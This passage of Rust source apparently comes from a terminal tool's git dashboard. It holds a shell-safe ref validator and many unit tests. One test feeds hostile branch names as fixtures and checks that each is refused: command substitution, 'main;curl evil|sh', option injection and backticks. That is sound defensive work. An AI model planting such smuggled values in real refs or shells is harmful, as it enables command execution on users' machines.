                    Load::Loaded(v) => filtered_issues(v, &g.filter).nth(g.cursor)?.number,
                    _ => return None,
                };
                Some(format!("gh issue view {n}"))
            }
            Section::Commits => {
                let sha = match &g.commits {
                    Load::Loaded(v) => filtered_commits(v, &g.filter).nth(g.cursor)?.sha.clone(),
                    _ => return None,
                };
                let sha = shell_safe_ref(&sha)?;
                Some(format!("git show {sha}"))
            }
            Section::Branches if diff => {
                let name = match &g.branches {
                    Load::Loaded(v) => filtered_branches(v, &g.filter).nth(g.cursor)?.name.clone(),
                    _ => return None,
                };
                let name = shell_safe_ref(&name)?;
                Some(format!("git log --oneline -20 {name}"))
            }
            _ => None,
        }
    }
}

/// Gate a git ref/sha before it's interpolated into a command typed at the
/// user's **interactive shell** (`git_run_in_pane`). Git's ref format permits
/// shell metacharacters (`;`, `$(…)`, `|`, backticks…), so a branch fetched
/// from an untrusted repo could otherwise execute in the user's shell.
/// Real-world refs use only this charset; anything outside it (or a leading
/// `-`, which would read as an option) is refused — the action is dropped
/// rather than quoted, since quoting rules differ across shells (fish vs
/// POSIX) and a metacharacter ref is essentially always hostile.
fn shell_safe_ref(s: &str) -> Option<&str> {
    let ok = !s.is_empty()
        && !s.starts_with('-')
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '/' | '-'));
    ok.then_some(s)
}

#[cfg(all(test, unix))]
mod tests {
    use super::*;
    use std::process::Command;
    use std::time::{Duration, Instant};

    // A branch fetched from an untrusted repo may legally contain shell
    // metacharacters; those refs must never reach the interactive shell.
    #[test]
    fn hostile_branch_names_never_reach_the_shell() {
        use crate::git::model::BranchInfo;
        let mk = |name: &str| BranchInfo {
            name: name.to_string(),
            is_head: false,
            ahead: 0,
            behind: 0,
            subject: String::new(),
            author: String::new(),
            when: String::new(),
        };
        let (tx, _rx) = std::sync::mpsc::channel();
        let mut app = App::new(80, 24, tx).unwrap();
        let mut view = GitView::new(std::path::PathBuf::from("/tmp"));
        view.section = Section::Branches;
        view.branches = Load::Loaded(vec![
            mk("feat/scroll-mode_v2.1"), // normal → allowed
            mk("x$(touch /tmp/pwned)"),  // command substitution → refused
            mk("main;curl evil|sh"),     // command chaining → refused
            mk("--exec=evil"),           // option injection → refused
            mk("weird`cmd`"),            // backticks → refused
        ]);
        let placeholder = PaneId::alloc();
        app.workspaces[0].tabs.push(Tab {
            layout: TileLayout::new(placeholder),
            git: Some(Box::new(view)),
            orch: false,
            mission: false,
            name: None,
        });
        app.workspaces[0].active_tab = app.workspaces[0].tabs.len() - 1;

        let cmd_at = |app: &mut App, i: usize| {
            app.active_git_mut().unwrap().cursor = i;
            app.git_selected_command(true)
        };
        assert_eq!(
            cmd_at(&mut app, 0),
            Some("git log --oneline -20 feat/scroll-mode_v2.1".to_string()),
            "a normal branch still gets its diff command"
        );
        for i in 1..5 {
            assert_eq!(cmd_at(&mut app, i), None, "hostile branch {i} is refused");
        }
    }

    /// Enter (and a click) on a commit opens its `git show` in-tab — setting
    /// `open_commit` + a Loading detail — instead of running in a pane. A detail
    /// result loads, and `esc` returns to the list (docs/17).
    #[test]
    fn commit_enter_opens_in_tab_detail_and_esc_returns() {
        use crate::git::model::{Commit, CommitShow};
        use crate::git::GitPayload;

        let (tx, _rx) = std::sync::mpsc::channel();
        let mut app = App::new(80, 24, tx).unwrap();
        let mut view = GitView::new(std::path::PathBuf::from("/tmp"));
        let vid = view.id;
        view.section = Section::Commits;
        view.commits = Load::Loaded(vec![Commit {
            sha: "abc123".into(),
            subject: "fix things".into(),
            author: "me".into(),
            when: "now".into(),
            refs: String::new(),
            graph: String::new(),
        }]);
        let placeholder = PaneId::alloc();
        app.workspaces[0].tabs.push(Tab {
            layout: TileLayout::new(placeholder),
            git: Some(Box::new(view)),
            orch: false,
            mission: false,
            name: None,
        });
        app.workspaces[0].active_tab = app.workspaces[0].tabs.len() - 1;
        let tabs_before = app.ws().tabs.len();

        // Enter opens the in-tab detail (no new tab/pane).
        app.handle_git_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));
        assert_eq!(
            app.active_git().unwrap().open_commit.as_deref(),
            Some("abc123"),
            "the commit detail opened in-tab"
        );
        assert!(
            matches!(app.active_git().unwrap().commit_detail, Load::Loading),
            "its git show is loading"
        );
        assert_eq!(app.ws().tabs.len(), tabs_before, "no pane/tab was spawned");

        // A result loads into the detail.
        app.git_data(
            vid,
            GitPayload::CommitDetail(Box::new(Ok(CommitShow {
                lines: vec!["commit abc123".into(), "+added line".into()],
            }))),
        );
        assert!(
            matches!(app.active_git().unwrap().commit_detail, Load::Loaded(_)),
            "the git show output loaded"
        );

        // Esc goes back to the commit list.
        app.handle_git_key(KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE));
        assert!(
            app.active_git().unwrap().open_commit.is_none(),
            "esc returned to the list"
        );
        assert!(app.active_is_git(), "still on the git tab, not closed");
    }

    /// A git pane action (`c` = create PR) runs in a REAL terminal pane, never the
    /// orch board (the "opens the orch tab" bug).
    #[test]
    fn git_run_in_pane_skips_the_orch_board() {
        let (tx, _rx) = std::sync::mpsc::channel();
        let mut app = App::new(80, 24, tx).unwrap();
        // App::new gives a real pane tab at index 0. Add an orch board (index 1)
        // right before the git tab, so the old code would have jumped to it.
        let real_pane_tab = 0usize;
        app.workspaces[0].tabs.push(Tab {
            layout: TileLayout::new(PaneId::alloc()),
            git: None,
            orch: true,
            mission: false,
            name: None,
        });
        let orch_tab = 1usize;
        app.workspaces[0].tabs.push(Tab {
            layout: TileLayout::new(PaneId::alloc()),
            git: Some(Box::new(GitView::new(std::path::PathBuf::from("/tmp")))),
            orch: false,
            mission: false,
            name: None,
        });
        app.workspaces[0].active_tab = app.workspaces[0].tabs.len() - 1;

        // `c` (create PR) runs a git command in a pane.
        app.handle_git_key(KeyEvent::new(KeyCode::Char('c'), KeyModifiers::NONE));
        assert_ne!(
            app.ws().active_tab,
            orch_tab,
            "did not jump to the orch board"
        );
        assert_eq!(
            app.ws().active_tab,
            real_pane_tab,
            "ran in the real terminal pane"
        );
    }

    /// On a phone the git tab drops its keyboard-hint footer and gives those two
    /// rows to the list (docs/18); the desktop layout is unchanged.
    #[test]
    fn compact_git_tab_hides_the_footer_and_reclaims_its_rows() {
        use ratatui::{backend::TestBackend, Terminal};
        let _env = crate::persist::test_env("compact-git-footer");
        let (tx, _rx) = std::sync::mpsc::channel();
        let mut app = App::new(80, 24, tx).unwrap();
        app.workspaces[0].tabs.push(Tab {
            layout: TileLayout::new(PaneId::alloc()),
            git: Some(Box::new(GitView::new(std::path::PathBuf::from("/tmp")))),
            orch: false,
            mission: false,
            name: None,
        });
        app.workspaces[0].active_tab = app.workspaces[0].tabs.len() - 1;

        // Same height, wide vs phone-narrow: only the footer differs.
        let mut wide = Terminal::new(TestBackend::new(100, 40)).unwrap();
        wide.draw(|f| crate::ui::render(f, &mut app)).unwrap();
        assert!(!app.compact);
        let wide_body = app.active_git_mut().unwrap().list_area.height;

        let mut narrow = Terminal::new(TestBackend::new(40, 40)).unwrap();
        narrow.draw(|f| crate::ui::render(f, &mut app)).unwrap();
        assert!(app.compact);
        let compact_body = app.active_git_mut().unwrap().list_area.height;

        // Two rows reclaimed here (the footer + its separator), plus the compact
        // layout already gave the whole tab one more row (the hidden status bar).
        assert_eq!(
            compact_body,
            wide_body + 3,
            "the git list grows by the footer's rows plus the reclaimed status row"
        );
    }

    /// Enter on an issue opens its detail in-tab (like PRs/commits), and `esc`
    /// returns to the list (docs/17).
    #[test]
    fn issue_enter_opens_in_tab_detail() {
        use crate::git::model::{Issue, IssueDetail};
        use crate::git::GitPayload;

        let (tx, _rx) = std::sync::mpsc::channel();
        let mut app = App::new(80, 24, tx).unwrap();
        let mut view = GitView::new(std::path::PathBuf::from("/tmp"));
        let vid = view.id;
        view.section = Section::Issues;
        view.issues = Load::Loaded(vec![Issue {
            number: 7,
            title: "a bug".into(),
            author: "me".into(),
            labels: vec![],
            assignees: vec![],
            repo: String::new(),
        }]);
        let placeholder = PaneId::alloc();
        app.workspaces[0].tabs.push(Tab {
            layout: TileLayout::new(placeholder),
            git: Some(Box::new(view)),
            orch: false,
            mission: false,
            name: None,
        });
        app.workspaces[0].active_tab = app.workspaces[0].tabs.len() - 1;

        app.handle_git_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));
        assert_eq!(
            app.active_git().unwrap().open_issue,
            Some(7),
            "the issue detail opened in-tab"
        );
        app.git_data(
            vid,
            GitPayload::IssueDetail(Box::new(Ok(IssueDetail {
                number: 7,
                title: "a bug".into(),
                state: "OPEN".into(),
                author: "me".into(),
                body: "steps to reproduce".into(),
                labels: vec!["bug".into()],
                assignees: vec![],
                comments: 2,
                updated_at: "2026-07-23T00:00:00Z".into(),
            }))),
        );
        assert!(matches!(
            app.active_git().unwrap().issue_detail,
            Load::Loaded(_)
        ));
        app.handle_git_key(KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE));
        assert!(app.active_git().unwrap().open_issue.is_none(), "esc → list");
    }

    /// The default filter is Open; `s` cycles PRs open → closed → merged → all,
    /// while issues skip merged (open → closed → all).
    #[test]
    fn state_filter_cycles_per_section() {
        use crate::git::StateFilter;
        // PRs include merged.
        assert_eq!(StateFilter::Open.next(true), StateFilter::Closed);
        assert_eq!(StateFilter::Closed.next(true), StateFilter::Merged);
        assert_eq!(StateFilter::Merged.next(true), StateFilter::All);
        assert_eq!(StateFilter::All.next(true), StateFilter::Open);
        // Issues skip merged.
        assert_eq!(StateFilter::Closed.next(false), StateFilter::All);
        assert_eq!(StateFilter::Merged.issue_arg(), "all");
        assert_eq!(StateFilter::Merged.gh_arg(), "merged");

        let (tx, _rx) = std::sync::mpsc::channel();
        let mut app = App::new(80, 24, tx).unwrap();
        let mut view = GitView::new(std::path::PathBuf::from("/tmp"));
        view.section = Section::Prs;
        let placeholder = PaneId::alloc();
        app.workspaces[0].tabs.push(Tab {
            layout: TileLayout::new(placeholder),
            git: Some(Box::new(view)),
            orch: false,
            mission: false,
            name: None,
        });
        app.workspaces[0].active_tab = app.workspaces[0].tabs.len() - 1;
        // Default is Open (open PRs/issues, like before).
        assert_eq!(app.active_git().unwrap().state_filter, StateFilter::Open);
        app.handle_git_key(KeyEvent::new(KeyCode::Char('s'), KeyModifiers::NONE));
        assert_eq!(
            app.active_git().unwrap().state_filter,
            StateFilter::Closed,
            "s cycled to closed"
        );
    }

    /// End-to-end through the real mouse path + render: rendering sets the list
    /// area, and a click on a commit row opens its in-tab detail (docs/17).
    #[test]
    fn clicking_a_commit_row_opens_detail() {
        use crate::event::AppEvent;
        use crate::git::model::Commit;
        use ratatui::crossterm::event::{KeyModifiers, MouseButton, MouseEvent, MouseEventKind};
        use ratatui::{backend::TestBackend, Terminal};

        let mk = |sha: &str| Commit {
            sha: sha.into(),
            subject: format!("subject {sha}"),
            author: "me".into(),
            when: "now".into(),
            refs: String::new(),
            graph: String::new(),
        };
        let (tx, _rx) = std::sync::mpsc::channel();
        let mut app = App::new(100, 30, tx).unwrap();
        let mut view = GitView::new(std::path::PathBuf::from("/tmp"));
        view.section = Section::Commits;
        view.commits = Load::Loaded(vec![mk("aaa111"), mk("bbb222"), mk("ccc333")]);
        let placeholder = PaneId::alloc();
        app.workspaces[0].tabs.push(Tab {
            layout: TileLayout::new(placeholder),
            git: Some(Box::new(view)),
            orch: false,
            mission: false,
            name: None,
        });
        app.workspaces[0].active_tab = app.workspaces[0].tabs.len() - 1;

        // Render so the git tab records its commit-list body rect.
        let mut term = Terminal::new(TestBackend::new(100, 30)).unwrap();
        term.draw(|f| crate::ui::render(f, &mut app)).unwrap();
        let la = app.active_git().unwrap().list_area;
        assert!(la.height >= 2, "the list body has rows");

        // Click the second visible commit row.
        let down = MouseEvent {
            kind: MouseEventKind::Down(MouseButton::Left),
            column: la.x + 2,
            row: la.y + 1,
            modifiers: KeyModifiers::NONE,
        };
        app.handle_event(AppEvent::Mouse(down));
        assert_eq!(
            app.active_git().unwrap().open_commit.as_deref(),
            Some("bbb222"),
            "clicking the 2nd commit row opened that commit's detail in-tab"
        );
    }

    #[test]
    fn default_section_is_commits_and_click_switches() {
        let view = GitView::new(std::path::PathBuf::from("/tmp"));
        // Commits is the first/default view (not PRs).
        assert_eq!(view.section, Section::Commits);

        let (tx, _rx) = std::sync::mpsc::channel();
        let mut app = App::new(80, 24, tx).unwrap();
        let placeholder = PaneId::alloc();
        app.workspaces[0].tabs.push(Tab {
            layout: TileLayout::new(placeholder),
            git: Some(Box::new(view)),
            orch: false,
            mission: false,
            name: None,
        });
        app.workspaces[0].active_tab = app.workspaces[0].tabs.len() - 1;

        // A "click" on the Flow tab switches the active section.
        app.git_click_section(Section::Flow);
        assert_eq!(app.active_git().unwrap().section, Section::Flow);
        app.git_click_section(Section::Prs);
        assert_eq!(app.active_git().unwrap().section, Section::Prs);
    }

    /// End-to-end through the real render + input path: contributor emails are
    /// hidden by default (privacy) and `x` reveals them; the collapsed list hides
    /// authors under 10 commits behind a clickable "show more" row that reveals
    /// everyone.
    #[test]
    fn contributor_list_hides_emails_and_expands_on_click() {
        use crate::git::model::{Contributor, RepoInfo, RepoStatus};
        use ratatui::{backend::TestBackend, Terminal};

        let mut view = GitView::new(std::path::PathBuf::from("/tmp"));
        view.status = Load::Loaded(RepoStatus::default());
        view.info = Load::Loaded(RepoInfo {
            remote_url: None,
            slug: None,
            host: None,
            total_commits: 600,
            age: None,
            contributors: vec![
                Contributor {
                    name: "ada".into(),
                    email: "ada@inbox.test".into(),
                    commits: 500,
                },
                // Under the 10-commit floor: hidden until the list is expanded.
                Contributor {
                    name: "driveby".into(),
                    email: "driveby@inbox.test".into(),
                    commits: 2,
                },
            ],
        });
        view.section = Section::Status;

        let (tx, _rx) = std::sync::mpsc::channel();
        let mut app = App::new(170, 24, tx).unwrap();
        let placeholder = PaneId::alloc();
        app.workspaces[0].tabs.push(Tab {
            layout: TileLayout::new(placeholder),
            git: Some(Box::new(view)),
            orch: false,
            mission: false,
            name: None,
        });
        app.workspaces[0].active_tab = app.workspaces[0].tabs.len() - 1;

        let mut term = Terminal::new(TestBackend::new(170, 24)).unwrap();
        let screen = |app: &mut App, term: &mut Terminal<TestBackend>| -> String {
            term.draw(|f| crate::ui::render(f, app)).unwrap();
            let buf = term.backend().buffer();
            (0..buf.area.height)
                .map(|r| {
                    (0..buf.area.width)
                        .map(|c| buf.cell((c, r)).map(|x| x.symbol()).unwrap_or(" "))
                        .collect::<String>()
                })
                .collect::<Vec<_>>()
                .join("\n")
        };

        // Default: the contributor is listed, their email is not, and the
        // under-10 author is behind a "show more" affordance.
        let s = screen(&mut app, &mut term);
        assert!(s.contains("ada"), "the contributor is listed:\n{s}");
        assert!(
            !s.contains("inbox.test"),
            "emails are hidden by default:\n{s}"
        );
        assert!(!s.contains("driveby"), "under-10 author hidden:\n{s}");
        assert!(
            s.contains("+1"),
            "a show-more row offers the hidden author:\n{s}"
        );

        // Clicking that row expands the list to every author, including under-10.
        let more = app
            .active_git()
            .unwrap()
            .contributors_more_rect
            .expect("the show-more row is on screen");
        app.handle_event(crate::event::AppEvent::Mouse(
            ratatui::crossterm::event::MouseEvent {
                kind: ratatui::crossterm::event::MouseEventKind::Down(
                    ratatui::crossterm::event::MouseButton::Left,
                ),
                column: more.x + 3,
                row: more.y,
                modifiers: ratatui::crossterm::event::KeyModifiers::NONE,
            },
        ));
        let s = screen(&mut app, &mut term);
        assert!(
            s.contains("driveby"),
            "expanding reveals the under-10 author:\n{s}"
        );
        assert!(
            !s.contains("inbox.test"),
            "expanding still does not leak emails:\n{s}"
        );

        // `x` reveals emails on demand — sent as a real key press, so the binding
        // itself is covered (it is intentionally absent from the hint line).
        app.handle_event(crate::event::AppEvent::Key(
            ratatui::crossterm::event::KeyEvent::new(
                ratatui::crossterm::event::KeyCode::Char('x'),
                ratatui::crossterm::event::KeyModifiers::NONE,
            ),
        ));
        let s = screen(&mut app, &mut term);
        assert!(s.contains("ada@inbox.test"), "`x` reveals emails:\n{s}");
        // …and the hint line still does not advertise it.
        assert!(
            !s.contains("email"),
            "the footer must not mention the email toggle:\n{s}"
        );
    }

    #[test]
    fn scroll_routes_to_block_or_cursor_and_clamps() {
        use crate::git::model::{Commit, FileChange, RepoStatus};
        use ratatui::{backend::TestBackend, Terminal};

        let mut view = GitView::new(std::path::PathBuf::from("/tmp"));
        let status = RepoStatus {
            unstaged: (0..20)
                .map(|i| FileChange {
                    code: 'M',
                    path: format!("f{i}.rs"),
                })
                .collect(),
            ..Default::default()
        };
        view.status = Load::Loaded(status);
        view.commits = Load::Loaded(
            (0..20)
                .map(|i| Commit {
                    sha: format!("s{i}"),
                    subject: "x".into(),
                    author: "a".into(),
                    when: "now".into(),
                    refs: String::new(),
                    graph: String::new(),
                })
                .collect(),
        );
        view.section = Section::Status;

        let (tx, _rx) = std::sync::mpsc::channel();
        let mut app = App::new(40, 12, tx).unwrap();
        let placeholder = PaneId::alloc();
        app.workspaces[0].tabs.push(Tab {
            layout: TileLayout::new(placeholder),
            git: Some(Box::new(view)),
            orch: false,
            mission: false,
            name: None,
        });
        app.workspaces[0].active_tab = app.workspaces[0].tabs.len() - 1;

        // Status scrolls as a block (offset moves, not a cursor).
        app.git_scroll(3);
        assert_eq!(app.active_git().unwrap().scroll, 3);
        assert_eq!(app.active_git().unwrap().cursor, 0);

        // An over-scroll is clamped to the content during render.
        if let Some(g) = app.active_git_mut() {
            g.scroll = 999;
        }
        let mut term = Terminal::new(TestBackend::new(40, 12)).unwrap();
        term.draw(|f| crate::ui::render(f, &mut app)).unwrap();
        assert!(
            app.active_git().unwrap().scroll < 20,
            "status scroll clamped to content"
        );

        // Commits is a cursor list: scrolling moves the cursor instead.
        app.git_click_section(Section::Commits);
        assert_eq!(app.active_git().unwrap().scroll, 0); // reset on switch
        app.git_scroll(2);
        assert_eq!(app.active_git().unwrap().cursor, 2);
    }

    /// A workspace whose fixed `cwd` is not a repo, but whose focused pane
    /// has since `cd`'d into one, still opens the git tab: `open_git_tab`
    /// falls back to the pane's live cwd instead of silently no-op'ing
    /// (issue/67).
    #[test]
    fn git_tab_falls_back_to_focused_pane_cwd() {
        let repo =
            std::env::temp_dir().join(format!("luvus-gittab-fallback-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&repo);
        std::fs::create_dir_all(&repo).unwrap();
        Command::new("git")
            .args(["init", "-q"])
            .current_dir(&repo)
            .output()
            .expect("git");

        let not_repo =
            std::env::temp_dir().join(format!("luvus-gittab-notrepo-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&not_repo);
        std::fs::create_dir_all(&not_repo).unwrap();

        let (tx, _rx) = std::sync::mpsc::channel();
        let mut app = App::new(80, 24, tx).unwrap();
        // The workspace root stays fixed at a non-repo folder...
        app.workspaces[0].cwd = not_repo;
        // ...but the focused pane (created by `App::new`) has `cd`'d into the repo.
        let focus = app.layout().focus;
        app.panes.get_mut(&focus).unwrap().cwd = repo.clone();

        app.open_git_tab(0);
        let view = app
            .active_git()
            .expect("git tab opens using the focused pane's cwd, not the stale workspace root");
        assert_eq!(
            view.repo_root, repo,
            "the git tab targets the focused pane's repo, not the workspace root"
        );
    }

    #[test]
    fn git_tab_opens_fetches_and_persists_safely() {
        // A temp git repo with two branches + one commit.
        let repo = std::env::temp_dir().join(format!("luvus-gittab-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&repo);
        std::fs::create_dir_all(&repo).unwrap();
        std::fs::write(repo.join("f.txt"), "hi").unwrap();
        let g = |args: &[&str]| {
            Command::new("git")
                .args(args)
                .current_dir(&repo)
                .output()
                .expect("git");
        };
        g(&["init", "-q", "-b", "main"]);
        g(&["add", "-A"]);
        g(&[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "init",
        ]);
        g(&["branch", "feature/x"]);

        let (tx, rx) = std::sync::mpsc::channel();
        let mut app = App::new(80, 24, tx).unwrap();
        app.workspaces[0].cwd = repo.clone();
        app.workspaces[0].branch = Some("main".into());

        app.open_git_tab(0);
        assert!(app.active_is_git(), "git tab opened for a repo");

        // Pump the async fetches until branches load. The git tab kicks off one
        // fetch per view (commits/branches/PRs/issues/status) on separate
        // threads, so event order and count are nondeterministic — and the
        // `gh`-backed views can resolve first (with errors when `gh` is absent,
        // e.g. in CI). Draining a fixed number of events would race; wait for
        // the branches event specifically, bounded by a deadline.
        let deadline = Instant::now() + Duration::from_secs(10);
        while !matches!(app.active_git().unwrap().branches, Load::Loaded(_))
            && Instant::now() < deadline
        {
            if let Ok(ev) = rx.recv_timeout(Duration::from_millis(200)) {
                app.handle_event(ev);
            }
        }
        match &app.active_git().unwrap().branches {
            Load::Loaded(v) => {
                assert!(v.iter().any(|b| b.name == "main"), "main fetched");
                assert!(v.iter().any(|b| b.name == "feature/x"), "feature fetched");
            }
            other => panic!("branches not loaded: {}", matches!(other, Load::Error(_))),
        }

        // A git tab open at save time is persisted and restored (docs/17): the
        // snapshot keeps both the pane tab and the git tab, and the restore
        // re-creates the dashboard for the (still-valid) repo.
        let snap = crate::persist::snapshot(&app);
        assert_eq!(snap.workspaces[0].tabs.len(), 2, "pane + git tab persisted");
        assert!(
            snap.workspaces[0].tabs.iter().any(|t| t.git),
            "git tab is flagged in the snapshot"
        );
        let (tx2, _rx2) = std::sync::mpsc::channel();
        let restored = App::from_snapshot(snap, tx2).expect("session restores");
        assert!(
            restored.workspaces[0].tabs.iter().any(Tab::is_git),
            "git tab restored"
        );

        // Re-open is idempotent; close returns to a pane tab.
        app.open_git_tab(0);
        assert_eq!(
            app.workspaces[0].tabs.iter().filter(|t| t.is_git()).count(),
            1,
            "one git tab per workspace"
        );
        // `Ctrl+Space x` closes the active git tab (no real pane to close).
        let tabs_before = app.ws().tabs.len();
        app.handle_event(AppEvent::Key(KeyEvent::new(
            KeyCode::Char(' '),
            KeyModifiers::CONTROL,
        )));
        app.handle_event(AppEvent::Key(KeyEvent::new(
            KeyCode::Char('x'),
            KeyModifiers::NONE,
        )));
        assert!(!app.active_is_git(), "x closed the git tab");
        assert_eq!(
            app.ws().tabs.len(),
            tabs_before - 1,
            "the git tab was removed"
        );

        let _ = std::fs::remove_dir_all(&repo);
    }

    #[test]
    fn pr_actions_produce_commands() {
        use crate::git::model::{Checks, PullRequest};
        use crate::git::{GitView, Section};

        let pr = PullRequest {
            number: 42,
            title: "t".into(),
            author: "a".into(),
            state: "OPEN".into(),
            is_draft: false,
            review_decision: String::new(),
            reviewers: vec![],
            head: "feat/x".into(),
            additions: 1,
            deletions: 0,
            checks: Checks::None,
            repo: String::new(),
        };
        let (tx, _rx) = std::sync::mpsc::channel();
        let mut app = App::new(80, 24, tx).unwrap();
        // Attach a git tab with one loaded PR (no repo / threads needed).
        let mut view = GitView::new(std::path::PathBuf::from("/tmp"));
        view.section = Section::Prs;
        view.prs = Load::Loaded(vec![pr]);
        let placeholder = PaneId::alloc();
        app.workspaces[0].tabs.push(Tab {
            layout: TileLayout::new(placeholder),
            git: Some(Box::new(view)),
            orch: false,
            mission: false,
            name: None,
        });
        app.workspaces[0].active_tab = app.workspaces[0].tabs.len() - 1;
        assert!(app.active_is_git());

        assert_eq!(
            app.git_selected_command(false).as_deref(),
            Some("gh pr checkout 42")
        );
        assert_eq!(
            app.git_selected_command(true).as_deref(),
            Some("gh pr diff 42")
        );
    }

    #[test]
    fn ci_failure_notifies_only_on_transition() {
        use crate::git::model::{Checks, PullRequest};
        use crate::git::GitPayload;

        let pr = |checks| PullRequest {
            number: 42,
            title: "t".into(),
            author: "a".into(),
            state: "OPEN".into(),
            is_draft: false,
            review_decision: String::new(),
            reviewers: vec![],
            head: "feat".into(),
            additions: 0,
            deletions: 0,
            checks,
            repo: String::new(),
        };

        let (tx, _rx) = std::sync::mpsc::channel();
        let mut app = App::new(80, 24, tx).unwrap();

        let mut view = GitView::new(std::path::PathBuf::from("/tmp"));
        view.prev_pr_checks.insert(42, Checks::Passing); // was green
        let vid = view.id;
        let placeholder = PaneId::alloc();
        app.workspaces[0].tabs.push(Tab {
            layout: TileLayout::new(placeholder),
            git: Some(Box::new(view)),
            orch: false,
            mission: false,
            name: None,
        });
        app.workspaces[0].active_tab = app.workspaces[0].tabs.len() - 1;

        // Passing → Failing fires a notification.
        app.git_data(vid, GitPayload::Prs(Ok(vec![pr(Checks::Failing)])));
        assert!(
            app.pending_notify
                .iter()
                .any(|m| m.contains("PR #42 checks failed")),
            "alert on transition to red: {:?}",
            app.pending_notify
        );

        // Still failing on the next refresh → no repeat alert.
        app.pending_notify.clear();
        app.git_data(vid, GitPayload::Prs(Ok(vec![pr(Checks::Failing)])));
        assert!(app.pending_notify.is_empty(), "no repeat while still red");
    }
}
